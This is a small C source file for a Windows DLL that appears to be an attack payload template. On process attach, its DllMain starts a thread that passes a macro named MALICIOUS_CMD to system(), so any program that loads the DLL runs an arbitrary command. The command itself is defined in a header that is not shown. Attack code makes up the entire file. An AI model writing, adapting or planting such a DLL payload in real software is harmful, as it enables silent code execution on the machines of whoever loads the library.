#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#include "dllmain.h"

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    system(MALICIOUS_CMD);
    return 0;
}


int DllMain( void* hModule, int  ul_reason_for_call, void* lpReserved)
{

    if (ul_reason_for_call == 1) {
        HANDLE threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
    }

    return 1;
}